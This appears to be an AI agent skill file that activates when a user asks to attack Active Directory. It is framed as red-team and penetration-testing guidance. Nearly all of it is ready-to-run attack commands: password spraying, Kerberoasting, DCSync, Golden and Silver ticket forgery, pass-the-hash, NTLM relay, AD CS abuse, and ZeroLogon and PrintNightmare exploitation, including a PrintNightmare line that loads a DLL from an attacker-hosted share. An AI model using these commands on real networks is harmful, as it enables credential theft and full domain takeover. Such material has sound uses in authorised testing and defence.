---
name: active-directory-attacks
description: Use this skill when the user asks to "attack Active Directory", "exploit AD", "Kerberoasting", "DCSync", "pass-the-hash", "BloodHound enumeration", "Golden Ticket", "Silver Ticket", "AS-REP roasting", "NTLM relay", or needs guidance on Windows domain penetration testing.
---

# Active Directory Attacks

## Purpose

Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing.

## Inputs/Prerequisites

- Kali Linux or Windows attack platform
- Domain user credentials (for most attacks)
- Network access to Domain Controller
- Tools: Impacket, Mimikatz, BloodHound, Rubeus, CrackMapExec

## Outputs/Deliverables

- Domain enumeration data
- Extracted credentials and hashes
- Kerberos tickets for impersonation
- Domain Administrator access
- Persistent access mechanisms

---

## Essential Tools

| Tool | Purpose |
|------|---------|
| BloodHound | AD attack path visualization |
| Impacket | Python AD attack tools |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos attacks |
| CrackMapExec | Network exploitation |
| PowerView | AD enumeration |
| Responder | LLMNR/NBT-NS poisoning |

---

## Core Workflow

### Step 1: Kerberos Clock Sync

Kerberos requires clock synchronization (±5 minutes):

```bash
# Detect clock skew
nmap -sT <domain_controller_ip> -p445 --script smb2-time

# Fix clock on Linux
sudo date -s "<date_time>"

# Fix clock on Windows
net time /domain /set

# Fake clock without changing system time
faketime -f '+8h' <command>
```

### Step 2: AD Reconnaissance with BloodHound

```bash
# Start BloodHound
neo4j console
bloodhound --no-sandbox

# Collect data with SharpHound
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername <username> --ldappassword <password>

# Python collector (from Linux)
bloodhound-python -u '<username>' -p '<password>' -d <domain> -ns <domain_controller_ip> -c all
```

### Step 3: PowerView Enumeration

```powershell
# Get domain info
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# Enumerate users
Get-NetUser
Get-NetUser -SamAccountName <targetuser>
Get-UserProperty -Properties pwdlastset

# Enumerate groups
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# Find local admin access
Find-LocalAdminAccess -Verbose

# User hunting
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

---

## Credential Attacks

### Password Spraying

```bash
# Using kerbrute
./kerbrute passwordspray -d <domain> --dc <domain_controller_ip> <users_file> <password>

# Using CrackMapExec
crackmapexec smb <domain_controller_ip> -u <users_file> -p '<password>' --continue-on-success
```

### Kerberoasting

Extract service account TGS tickets and crack offline:

```bash
# Impacket
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <domain_controller_ip> -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap <domain_controller_ip> -u <user> -p <password> --kerberoast output.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt <wordlist>
```

### AS-REP Roasting

Target accounts with "Do not require Kerberos preauthentication":

```bash
# Impacket
GetNPUsers.py <domain>/ -usersfile <users_file> -dc-ip <domain_controller_ip> -format hashcat

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Crack with hashcat
hashcat -m 18200 hashes.txt <wordlist>
```

### DCSync Attack

Extract credentials directly from DC (requires Replicating Directory Changes rights):

```bash
# Impacket
secretsdump.py <domain>/<admin>:<password>@<domain_controller_ip> -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:<domain> /user:krbtgt
lsadump::dcsync /domain:<domain> /user:Administrator
```

---

## Kerberos Ticket Attacks

### Pass-the-Ticket (Golden Ticket)

Forge TGT with krbtgt hash for any user:

```powershell
# Get krbtgt hash via DCSync first
# Mimikatz - Create Golden Ticket
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<HASH> /id:500 /ptt

# Impacket
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <domain_sid> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <domain>/Administrator@<domain_controller>
```

### Silver Ticket

Forge TGS for specific service:

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<target_service> /service:cifs /rc4:<SERVICE_HASH> /ptt
```

### Pass-the-Hash

```bash
# Impacket
psexec.py <domain>/Administrator@<domain_controller_ip> -hashes :<NTHASH>
wmiexec.py <domain>/Administrator@<domain_controller_ip> -hashes :<NTHASH>
smbexec.py <domain>/Administrator@<domain_controller_ip> -hashes :<NTHASH>

# CrackMapExec
crackmapexec smb <domain_controller_ip> -u Administrator -H <NTHASH> -d <domain>
crackmapexec smb <domain_controller_ip> -u Administrator -H <NTHASH> --local-auth
```

### OverPass-the-Hash

Convert NTLM hash to Kerberos ticket:

```bash
# Impacket
getTGT.py <domain>/<user> -hashes :<NTHASH>
export KRB5CCNAME=<user>.ccache

# Rubeus
.\Rubeus.exe asktgt /user:<user> /rc4:<NTHASH> /ptt
```

---

## NTLM Relay Attacks

### Responder + ntlmrelayx

```bash
# Start Responder (disable SMB/HTTP for relay)
responder -I <interface> -wrf

# Start relay
ntlmrelayx.py -tf <targets_file> -smb2support

# LDAP relay for delegation attack
ntlmrelayx.py -t ldaps://<domain_controller> -wh <attacker_wpad> --delegate-access
```

### SMB Signing Check

```bash
crackmapexec smb <subnet> --gen-relay-list <targets_file>
```

---

## Certificate Services Attacks (AD CS)

### ESC1 - Misconfigured Templates

```bash
# Find vulnerable templates
certipy find -u <user>@<domain> -p <password> -dc-ip <domain_controller_ip>

# Exploit ESC1
certipy req -u <user>@<domain> -p <password> -ca <CA_NAME> -target <domain_controller> -template <VulnTemplate> -upn <admin_user>@<domain>

# Authenticate with certificate
certipy auth -pfx <admin_user>.pfx -dc-ip <domain_controller_ip>
```

### ESC8 - Web Enrollment Relay

```bash
ntlmrelayx.py -t http://<ca_domain>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## Critical CVEs

### ZeroLogon (CVE-2020-1472)

```bash
# Check vulnerability
crackmapexec smb <domain_controller_ip> -u '' -p '' -M zerologon

# Exploit
python3 cve-2020-1472-exploit.py <DC_NAME> <domain_controller_ip>

# Extract hashes
secretsdump.py -just-dc <domain>/<DC_NAME>\$@<domain_controller_ip> -no-pass

# Restore password (important!)
python3 restorepassword.py <domain>/<DC_NAME>@<DC_NAME> -target-ip <domain_controller_ip> -hexpass <HEXPASSWORD>
```

### PrintNightmare (CVE-2021-1675)

```bash
# Check for vulnerability
rpcdump.py @<domain_controller_ip> | grep 'MS-RPRN'

# Exploit (requires hosting malicious DLL)
python3 CVE-2021-1675.py <domain>/<user>:<pass>@<domain_controller_ip> '\\<attacker>\share\evil.dll'
```

### samAccountName Spoofing (CVE-2021-42278/42287)

```bash
# Automated exploitation
python3 sam_the_admin.py "<domain>/<user>:<password>" -dc-ip <domain_controller_ip> -shell
```

---

## Quick Reference

| Attack | Tool | Command |
|--------|------|---------|
| Kerberoast | Impacket | `GetUserSPNs.py <domain>/<user>:<pass> -request` |
| AS-REP Roast | Impacket | `GetNPUsers.py <domain>/ -usersfile <users_file>` |
| DCSync | secretsdump | `secretsdump.py <domain>/<admin>:<pass>@<DC>` |
| Pass-the-Hash | psexec | `psexec.py <domain>/<user>@<target> -hashes :<HASH>` |
| Golden Ticket | Mimikatz | `kerberos::golden /user:<Admin> /krbtgt:<HASH>` |
| Spray | kerbrute | `kerbrute passwordspray -d <domain> <users_file> <pass>` |

---

## Constraints

**Must:**
- Synchronize time with DC before Kerberos attacks
- Have valid domain credentials for most attacks
- Document all compromised accounts

**Must Not:**
- Lock out accounts with excessive password spraying
- Modify production AD objects without approval
- Leave Golden Tickets without documentation

**Should:**
- Run BloodHound for attack path discovery
- Check for SMB signing before relay attacks
- Verify patch levels for CVE exploitation

---

## Examples

### Example 1: Domain Compromise via Kerberoasting

```bash
# 1. Find service accounts with SPNs
GetUserSPNs.py <domain>/lowpriv:<password> -dc-ip <domain_controller_ip>

# 2. Request TGS tickets
GetUserSPNs.py <domain>/lowpriv:<password> -dc-ip <domain_controller_ip> -request -outputfile tgs.txt

# 3. Crack tickets
hashcat -m 13100 tgs.txt <wordlist>

# 4. Use cracked service account
psexec.py <domain>/svc_admin:<CrackedPassword>@<domain_controller_ip>
```

### Example 2: NTLM Relay to LDAP

```bash
# 1. Start relay targeting LDAP
ntlmrelayx.py -t ldaps://<domain_controller> --delegate-access

# 2. Trigger authentication (e.g., via PrinterBug)
python3 printerbug.py <domain>/<user>:<pass>@<target> <target_ip>

# 3. Use created machine account for RBCD attack
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Clock skew too great | Sync time with DC or use faketime |
| Kerberoasting returns empty | No service accounts with SPNs |
| DCSync access denied | Need Replicating Directory Changes rights |
| NTLM relay fails | Check SMB signing, try LDAP target |
| BloodHound empty | Verify collector ran with correct creds |

---

## Additional Resources

For advanced techniques including delegation attacks, GPO abuse, RODC attacks, SCCM/WSUS deployment, ADCS exploitation, trust relationships, and Linux AD integration, see [references/advanced-attacks.md](references/advanced-attacks.md).